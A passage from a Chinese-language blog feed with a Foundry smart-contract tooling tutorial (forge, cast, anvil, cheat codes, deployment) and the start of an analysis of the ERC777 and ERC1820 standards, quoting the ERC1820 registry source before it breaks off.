class="code"><pre><span class="line">cargo install --git https:&#x2F;&#x2F;github.com&#x2F;foundry-rs&#x2F;foundry --bins --locked</span><br></pre></td></tr></table></figure><p><strong>Docker</strong>:</p><p>你还可以通过docker安装foundry</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ghcr.io&#x2F;foundry-rs&#x2F;foundry:latest</span><br></pre></td></tr></table></figure><p>但是我在win10上执行<code>cargo install --git https://github.com/foundry-rs/foundry --bins --locked</code>命令时遇到了一点问题，foundry-cli一直安装不成功。最后我发现居然可以直接可以在github上下载exe文件 <a href="https://github.com/foundry-rs/foundry/releases" target="_blank" rel="noopener">github地址</a>，下载完了之后配置一下环境变量，即可正常使用forge,cast,anvil三个核心组件。</p><h2 id="Foundry包含的组件"><a href="#Foundry包含的组件" class="headerlink" title="Foundry包含的组件"></a>Foundry包含的组件</h2><h3 id="forge"><a href="#forge" class="headerlink" title="forge"></a>forge</h3><p>Forge是一个CLI工具，用于构建、测试、模糊测试、部署和验证Solidity合约。Forge同样有很多的子命令。</p><h4 id="init"><a href="#init" class="headerlink" title="init"></a>init</h4><p>它可以初始化一个新的版本库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge init my_gigabrain_protocol</span><br></pre></td></tr></table></figure><h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><p><code>install</code>子命令允许你安装指定版本的依赖项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge install Rari-Capital&#x2F;solmate@v6</span><br></pre></td></tr></table></figure><p>这将安装由<code>Rari-Capital</code>拥有的<code>solmate</code>软件库</p><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>为了运行测试，我们可以使用以下方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test</span><br></pre></td></tr></table></figure><p>和hardhat类似，我们也可以通过路径去唯一指定test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test --match-contract testname</span><br></pre></td></tr></table></figure><h5 id="影藏功能"><a href="#影藏功能" class="headerlink" title="影藏功能"></a>影藏功能</h5><p>test有很多隐藏功能<a href="https://book.getfoundry.sh/reference/forge/forge-test" target="_blank" rel="noopener">锻造测试 - 铸造手册 (getfoundry.sh)</a></p><ul><li><p>分叉</p><ul><li><p>可以通过 .<code>--fork-url &lt;URL&gt;</code></p><p>当测试在分叉环境中运行时，您可以像访问分叉链的所有状态一样 如果已部署合同。<a href="https://book.getfoundry.sh/cheatcodes/" target="_blank" rel="noopener">备忘码</a>仍然可用。</p><p>您还可以通过传递 来指定要从中分叉的块号。从 特定块，链数据缓存到 .如果您不想缓存链数据， 通过。<code>--fork-block-number &lt;BLOCK&gt;``~/.foundry/cache``--no-storage-caching</code></p><p>在分叉环境中运行时无法由本地协定解码的跟踪（例如，调用 存在于主网上的合约，如代币）可以选择使用Etherscan进行解码。使用以太扫描 对于跟踪解码，请设置或传递 。<code>ETHERSCAN_API_KEY``--etherscan-api-key &lt;KEY&gt;</code></p></li></ul></li><li><p>—gas-report</p><ul><li><p>打印气体报告。</p><p><img src="gas_report.png" alt=""></p></li></ul></li><li><p>-vvvv</p><ul><li><p>EVM 的详细程度。</p><p>多次传递以增加详细程度（例如、、）。<code>-v``-vv``-vvv</code></p><p>详细级别： - 2：打印所有测试的日志 - 3：打印失败测试的执行跟踪 - 4：打印所有测试的执行跟踪，以及失败测试的设置跟踪 - 5：<br>打印所有测试</p></li></ul></li></ul><h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p>foundry内置了一个强大的debug功能，使用如下命令 <code>$FUNC</code>是test模块的函数名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test --debug $FUNC</span><br></pre></td></tr></table></figure><p>这是debugger的实际效果</p><p>运行调试器时，将显示一个分为四个象限的终端：</p><ul><li><strong>象限 1</strong>：调试会话中的操作码，突出显示当前操作码。此外，还显示当前帐户的地址，程序计数器和累计的气体使用情况</li><li><strong>象限 2</strong>：当前堆栈以及堆栈的大小</li><li><strong>象限 3</strong>：源视图</li><li><strong>象限 4</strong>：EVM 的当前内存</li></ul><p><img src="debugger.png" alt=""></p><h3 id="Cast"><a href="#Cast" class="headerlink" title="Cast"></a>Cast</h3><p>Cast是一个CLI工具，用于对兼容以太坊虚拟机（EVM）的区块链进行RPC调用。使用<code>cast</code>，我们可以进行合约调用，查询数据，并处理编码和解码。<code>cast</code>有很多的子命令，所以要想获得完整的参考，请看Foundry书中的<a href="https://book.getfoundry.sh/reference/cast/" target="_blank" rel="noopener">cast</a>一节.</p><p>cast给我们提供了一个很方便的和EVM交互的工具</p><h3 id="Anvil"><a href="#Anvil" class="headerlink" title="Anvil"></a>Anvil</h3><p>Anvil是一个CLI工具，用于运行本地EVM区块链。它可以与ganache和hardhat节点相媲美，但好像更快。</p><p>要启动Anvil，只需使用avil命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anvil</span><br></pre></td></tr></table></figure><p>你也可以指定一些参数， 用<code>-v</code>来显示详细日志，如果用<code>-fork-url &lt;FORK_URL&gt;</code>指定URL来分叉一个公共网络，等等。要查看 <code>anvil</code>选项的完整列表，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anvil -h</span><br></pre></td></tr></table></figure><h2 id="Foundry作弊码"><a href="#Foundry作弊码" class="headerlink" title="Foundry作弊码"></a>Foundry作弊码</h2><p>Foundry有一套作弊代码，它可以对区块链的状态进行修改，以方便在测试时使用。这些代码可以直接执行合约：0x7109709ECfa91a80626fF3989D68f67F5b1DD12D 进行调用，但更多时候是通过标准库和vm对象执行。</p><p>你可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(bytes20(uint160(uint256(keccak256(&quot;hevm cheat code&quot;)))))</span><br></pre></td></tr></table></figure><p>来获取这个地址</p><p><strong>重要的作弊代码有：</strong></p><ul><li><strong>vm.warp(uint256) external;</strong> 设置 block.timestamp</li><li><strong>vm.roll(uint256) external;</strong> 设置 block.height.</li><li><strong>vm.prank(address) external;</strong> 设置地址作为下一次调用的msg.sender</li><li><strong>vm.startPrank(address) external;</strong> 设置地址作为所有后续调用的msg.sender</li><li><strong>vm.stopPrank() external;</strong> 重置后续调用msg.sender为<code>address(this)</code>。</li><li><strong>vm.deal(address, uint256) external;</strong> 设置一个地址的余额，参数：（who，newBalance）。</li><li><strong>vm.expectRevert(bytes calldata) external;</strong> 期待下次调用时出现错误。</li><li><strong>vm.record() external;</strong> 记录所有存储的读和写。</li><li><strong>vm.expectEmit(true, false, false, false); emit Transfer(address(this)); transfer();</strong> 检查事件主题1在两个事件中是否相等</li><li><strong>vm.load(address,bytes32)外部返回(bytes32);</strong> 从一个地址加载一个存储槽</li><li><strong>vm.store(address,bytes32,bytes32) external;</strong> 将一个值存储到一个地址的存储槽中，参数（who, slot, value）。</li></ul><p>这些可以用来改变测试的过程，如在这个例子中，告诉测试套件在调用时期望一个标准的算术错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm.expectRevert(stdError.arithmeticError);</span><br></pre></td></tr></table></figure><p>完整的列表在这里：<a href="https://github.com/foundry-rs/forge-std/blob/master/src/Vm.sol" target="_blank" rel="noopener">https://github.com/foundry-rs/forge-std/blob/master/src/Vm.sol</a></p><h2 id="Gas优化"><a href="#Gas优化" class="headerlink" title="Gas优化"></a>Gas优化</h2><p>编译时的合约Gas报告可以通过foundry.toml配置来设置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gas_reports</span> = [<span class="string">"MyContract"</span>, <span class="string">"MyContractFactory"</span>]</span><br></pre></td></tr></table></figure><p>然后用<em>forge test -gas-report</em>选项执行命令。</p><p>优化函数的一个方法是使用测试合约，并在修改前后进行快照对比：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">forge snapshot --snap gas1.txt</span><br><span class="line">&#x2F;&#x2F; make some changes</span><br><span class="line">forge snapshot --diff gas1.txt</span><br></pre></td></tr></table></figure><p>这将提供之前的Gas报告和当前快照之间的差异。</p><h2 id="部署和使用合约"><a href="#部署和使用合约" class="headerlink" title="部署和使用合约"></a>部署和使用合约</h2><p>Foundry也可以用来部署并与智能合约交互。</p><p>要部署一个合约，我们可以使用下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge create --rpc-url https://mainnet.infura.io --private-key abc123456789 src/MyContract.sol:MyContract --constructor-args <span class="string">"Hello Foundry"</span> <span class="string">"Arg2"</span></span><br></pre></td></tr></table></figure><p>注意我们在生产中部署时不应该使用硬编码的私钥。一个选择是使用-ledger或-trezor来通过硬件钱包执行。另外，也可以使用环境变量来存储私钥。</p><p>我们还可以使用forge命令<strong>在etherscan上验证合约</strong>，以便我们能够使用Etherscan的UI和Metamask与之交互。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge verify-contract --chain-id 1 --num-of-optimizations 200 --constructor-args (cast abi-encode &quot;constructor(string)&quot; &quot;Hello Foundry&quot; --compiler-version v0.8.10+commit.fc410830 0xContractAddressHere src&#x2F;MyContract.sol:MyContract ABCetherscanApiKey123</span><br></pre></td></tr></table></figure><p>要生成ABI，可以使用以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge inspect src&#x2F;MyContract.sol abi</span><br></pre></td></tr></table></figure><p>注意任何ABI都可以转换为接口并直接在solidity中使用： <a href="https://gnidan.github.io/abi-to-sol/" target="_blank" rel="noopener">https://gnidan.github.io/abi-to-sol/</a></p><p>如果合约已经被验证，我们也可以使用以下命令来生成一个接口。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast <span class="keyword">interface</span> <span class="number">0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984</span></span><br></pre></td></tr></table></figure><h2 id="用-Cast-与链上合约交互"><a href="#用-Cast-与链上合约交互" class="headerlink" title="用 Cast 与链上合约交互"></a>用 Cast 与链上合约交互</h2><p>我们可以call 方式调用合约请求链上数据。我们也可以提供凭证（私钥）来发送一个交易，就像我们在metamask中签署一个交易一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cast call 0xabc123 &quot;totalSupply()(uint256)&quot; --rpc-url https:&#x2F;&#x2F;eth-mainnet.alchemyapi.io</span><br><span class="line"></span><br><span class="line">cast send 0xabc123 &quot;mint(uint256)&quot; 3 --rpc-url https:&#x2F;&#x2F;eth-mainnet.alchemyapi.io --private-key&#x3D;abc123</span><br></pre></td></tr></table></figure><p>一旦区块被确认，也可以获取交易本身的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast tx 0xa1588a7c58a0ac632a9c7389b205f3999b7caee67ecb918d07b80f859aa605fd</span><br></pre></td></tr></table></figure><h2 id="Foundry编写Damn-Defi测试用例"><a href="#Foundry编写Damn-Defi测试用例" class="headerlink" title="Foundry编写Damn_Defi测试用例"></a>Foundry编写Damn_Defi测试用例</h2><p>这是我在油管上看到一个大佬重写的Damn_Defi，我通过跟着此<a href="https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry" target="_blank" rel="noopener">此测试</a>重做Damn_Defi学到很多</p><p>注：forge install如果失败，把镜像换成国内镜像，然后把lib下的所有文件夹删了再试。</p>]]></content>
      
      
      <categories>
          
          <category> Foundry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foundry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC777-1820</title>
      <link href="/ERC777-1820/"/>
      <url>/ERC777-1820/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC777，1820协议分析"><a href="#ERC777，1820协议分析" class="headerlink" title="ERC777，1820协议分析"></a>ERC777，1820协议分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="ERC777"><a href="#ERC777" class="headerlink" title="ERC777"></a>ERC777</h2><p>与以太坊生态系统中广泛采用的ERC20标准不同，ERC777标准通常被称为城里的新生儿。一个潜力巨大的孩子。有些人甚至声称ERC777标准是ERC20标准的有效继承者。ERC777标准规范在<a href="https://link.zhihu.com/?target=https%3A//github.com/ethereum/EIPs/blob/master/EIPS/eip-777.md">EIP777（以太坊改进提案</a>文件中有详尽描述。</p><h2 id="ERC777解决了哪些ERC20的问题"><a href="#ERC777解决了哪些ERC20的问题" class="headerlink" title="ERC777解决了哪些ERC20的问题?"></a>ERC777解决了哪些ERC20的问题?</h2><h3 id="转账通知机制"><a href="#转账通知机制" class="headerlink" title="转账通知机制"></a><strong>转账通知机制</strong></h3><p>由于<strong>ERC20 标准没有一个转账通知机制</strong>，很多ERC20代币误转到合约之后，再也没有办法把币转移出来，已经有大量的ERC20 因为这个原因被锁死，如<a href="https://etherscan.io/address/0x9a642d6b3368ddc662CA244bAdf32cDA716005BC" target="_blank" rel="noopener">锁死的QTUM</a>，<a href="https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0" target="_blank" rel="noopener">锁死的EOS</a> 。</p><h3 id="运营商机制"><a href="#运营商机制" class="headerlink" title="运营商机制"></a>运营商机制</h3><p>假设您希望允许第三方帐户（或合约）使用您的代币。最常见的需求是在使用去中心化交易所智能合约交易代币时。</p><p>此过程中的第一步是你需要通过调用ERC20智能合约上的<code>approve</code>方法函数来批准转账账户并设置他们有权获得的资金限额。除了用你的资金信任第三方之外，你还需要确保支出限额始终足以满足所需的交易，还需考虑gas等因素对交易的影响。</p><p>在ERC777的运营商机制下，你只需要转移操作权限后就什么都不用操心了。</p><h3 id="交易额外信息"><a href="#交易额外信息" class="headerlink" title="交易额外信息"></a>交易额外信息</h3><p>另外一个问题是<strong>ERC20 转账时，无法携带额外的信息</strong>，例如：我们有一些客户希望让用户使用 ERC20 代币购买商品，因为转账没法携带额外的信息， 用户的代币转移过来，不知道用户具体要购买哪件商品，从而展加了线下额外的沟通成本。</p><p>ERC777很好的解决了这些问题，同时ERC777 也兼容 ERC20 标准。因此强烈建议新开发的代币使用ERC777标准。</p><p>ERC777 在 ERC20的基础上定义了 <code>send(dest, value, data)</code> 来转移代币， send函数额外的参数用来携带其他的信息，send函数会检查持有者和接收者是否实现了相应的钩子函数，如果有实现（不管是普通用户地址还是合约地址都可以实现钩子函数），则调用相应的钩子函数。</p><h3 id="交易监听"><a href="#交易监听" class="headerlink" title="交易监听"></a>交易监听</h3><p>由于ERC1820接口的实现，使ERC777具有很完备的交易监听机制，利用这种监听可以完成许多功能，例如慈善机构的捐款记录，支出情况监听，等等。</p><blockquote><p>ERC20 标准下，可以通过一个变通的办法，采用两个交易组合完成，方法是：第1步：先让用户把要转移的金额用 ERC20 的approve 授权的存币合约（这步通常称为解锁），第2步：再次让用户调用存币合约的计息函数，目标函数中通过 transferFrom 把代币从用户手里转移的合约内，并开始监听到交易后的操作。</p></blockquote><h2 id="ERC1820-接口注册表合约"><a href="#ERC1820-接口注册表合约" class="headerlink" title="ERC1820 接口注册表合约"></a>ERC1820 接口注册表合约</h2><p>即便是一个普通用户地址，同样可以实现对 ERC777 转账的监听， 听起来有点神奇，其实这是通过 ERC1820 接口注册表合约来是实现的。</p><blockquote><p>ERC1820 相当的重要，以至于ERC777单独把它拆出来作为一个EIP。</p></blockquote><h3 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h3><p>在以太坊上有很多方法定义伪自省，<a href="https://learnblockchain.cn/docs/eips/eip-165.html" target="_blank" rel="noopener">ERC165</a>不能由普通用户帐户使用。 <a href="https://github.com/ethereum/EIPs/issues/672" target="_blank" rel="noopener">ERC672</a> 则使用了反向 <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a>，反向 <a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a> 有两个问题：增加了不必要的复杂度，其次，<a href="https://ens.domains/" target="_blank" rel="noopener">ENS</a> 是由多签控制的中心化合约。 从理论上讲，这种多签能够修改系统。</p><p>ERC1820标准比 <a href="https://github.com/ethereum/EIPs/issues/672" target="_blank" rel="noopener">ERC672</a> 简单得多，并且完全去中心化。</p><p>此标准还为所有链提供一个唯一（相同的）地址<code>0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24</code>。从而解决了解决不同链的查找注册表地址的问题。</p><h3 id="ERC1820规范"><a href="#ERC1820规范" class="headerlink" title="ERC1820规范"></a>ERC1820规范</h3><p>以下是ERC1820的源码及解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.5.3;</span><br><span class="line">&#x2F;&#x2F; IV is value needed to have a vanity address starting with &#39;0x1820&#39;.</span><br><span class="line">&#x2F;&#x2F; IV: 53759</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; @dev 如果合约为其他的地址实现了接口， 则必须实现这个接口。</span><br><span class="line">interface ERC1820ImplementerInterface &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 指示合约是否为地址 “addr” 实现接口 “interfaceHash”。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param interfaceHash 接口名称的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param addr 为哪一个地址实现接口</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return 只有当合约为地址&#39;addr&#39;实现&#39;interfaceHash&#39;时返回 ERC1820_ACCEPT_MAGIC</span><br><span class="line">    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; @title ERC1820 伪自省注册表合约</span><br><span class="line">&#x2F;&#x2F;&#x2F; @notice 该合约是ERC1820注册表的官方实现。</span><br><span class="line">contract ERC1820Registry &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice ERC165 无效 ID.</span><br><span class="line">    bytes4 constant internal INVALID_ID &#x3D; 0xffffffff;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice ERC165 的 supportsInterface 接口ID (&#x3D; &#96;bytes4(keccak256(&#39;supportsInterface(bytes4)&#39;))&#96;).</span><br><span class="line">    bytes4 constant internal ERC165ID &#x3D; 0x01ffc9a7;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 如果合约代表某个其他地址实现接口，则返回Magic值。</span><br><span class="line">    bytes32 constant internal ERC1820_ACCEPT_MAGIC &#x3D; keccak256(abi.encodePacked(&quot;ERC1820_ACCEPT_MAGIC&quot;));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 映射地址及接口到对应的实现合约地址</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(bytes32 &#x3D;&gt; address)) internal interfaces;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 映射地址到管理者</span><br><span class="line">    mapping(address &#x3D;&gt; address) internal managers;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 每个地址和erc165接口的flag，指示是否被缓存。</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(bytes4 &#x3D;&gt; bool)) internal erc165Cached;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 表示合约是&#39;addr&#39;的&#39;interfaceHash&#39;的&#39;实现者&#39;。</span><br><span class="line">    event InterfaceImplementerSet(address indexed addr, bytes32 indexed interfaceHash, address indexed implementer);</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 表示&#39;newManager&#39;是&#39;addr&#39;的新管理者的地址。</span><br><span class="line">    event ManagerChanged(address indexed addr, address indexed newManager);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 查询地址是否实现了接口以及通过哪个合约实现的。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _addr 查询地址（如果&#39;_addr&#39;是零地址，则假定为&#39;msg.sender&#39;）。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceHash 查询接口，它是接口名称字符串的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; 例如: &#39;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#39; 表示 &#39;ERC777TokensRecipient&#39; 接口.</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return 返回实现者的地址，没有实现返回 ‘0’</span><br><span class="line">    function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) &#123;</span><br><span class="line">        address addr &#x3D; _addr &#x3D;&#x3D; address(0) ? msg.sender : _addr;</span><br><span class="line">        if (isERC165Interface(_interfaceHash)) &#123;</span><br><span class="line">            bytes4 erc165InterfaceHash &#x3D; bytes4(_interfaceHash);</span><br><span class="line">            return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0);</span><br><span class="line">        &#125;</span><br><span class="line">        return interfaces[addr][_interfaceHash];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 设置某个地址的接口由哪个合约实现，需要由管理员来设置。（每个地址是他自己的管理员，直到设置了一个新的地址）。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _addr 待设置的关联接口的地址（如果&#39;_addr&#39;是零地址，则假定为&#39;msg.sender&#39;）</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _interfaceHash 接口，它是接口名称字符串的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; 例如: &#39;web3.utils.keccak256(&quot;ERC777TokensRecipient&quot;)&#39; 表示 &#39;ERC777TokensRecipient&#39; 接口。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param _implementer 为地址&#39;_addr&#39;实现了 &#39;_interfaceHash&#39;接口的合约地址</span><br><span class="line">    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external &#123;</span><br><span class="line">        address addr &#x3D; _addr &#x3D;&#x3D; address(0) ? msg.sender : _addr;</span><br><span class="line">        require(getManager(addr) &#x3D;&#x3D; msg.sender, &quot;Not the manager&quot;);</span><br><span class="line"></span><br><span class="line">        require(!isERC165Interface(_interfaceHash), &quot;Must not be an ERC165 hash&quot;);</span><br><span class="line">        if (_implementer !&#x3D; address(0) &amp;&amp; _implementer !&#x3D; msg.sender) &#123;</span><br><span class="line">            require(</span><br><span class="line">                ERC1820ImplementerInterface(_implementer)</span><br><span class="line">                    .canImplementInterfaceForAddress(_interfaceHash, addr) &#x3D;&#x3D; ERC1820_ACCEPT_MAGIC,</span><br><span class="line">                &quot;Does not implement the interface&quot;</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        interfaces[addr][_interfaceHash] &#x3D; _implementer;</span><br><span class="line">        emit InterfaceImplementerSet(addr, _interfaceHash, _implementer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 为地址_addr 设置新的管理员地址_newManager， 新的管理员能给&#39;_addr&#39; 调用 &#39;setInterfaceImplementer&#39; 设置是实现者。</span><br><span class="line">    &#x2F;&#x2F;&#x2F;  (传 &#39;0x0&#39; 为地址_addr 重置管理员)</span><br><span class="line"></span><br><span class="line">    function setManager(address _addr, address _newManager) external &#123;</span><br><span class="line">        require(getManager(_addr) &#x3D;&#x3D; msg.sender, &quot;Not the manager&quot;);</span><br><span class="line">        managers[_addr] &#x3D; _newManager &#x3D;&#x3D; _addr ? address(0) : _newManager;</span><br><span class="line">        emit ManagerChanged(_addr, _newManager);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 获取地址 _addr的管理员</span><br><span class="line">    function getManager(address _addr) public view returns(address) &#123;</span><br><span class="line">        &#x2F;&#x2F; By default the manager of an address is the same address</span><br><span class="line">        if (managers[_addr] &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            return _addr;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return managers[_addr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 计算给定名称的接口的keccak256哈希值。</span><br><span class="line">    function interfaceHash(string calldata _interfaceName) external pure returns(bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(_interfaceName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; ERC165 相关方法</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 更新合约是否实现了ERC165接口的缓存。</span><br><span class="line">    function updateERC165Cache(address _contract, bytes4 _interfaceId) external &#123;</span><br><span class="line">        interfaces[_contract][_interfaceId] &#x3D; implementsERC165InterfaceNoCache(</span><br><span class="line">            _contract, _interfaceId) ? _contract : address(0);</span><br><span class="line">        erc165Cached[_contract][_interfaceId] &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 检查合约是否实现ERC165接口。</span><br><span class="line">    &#x2F;&#x2F;  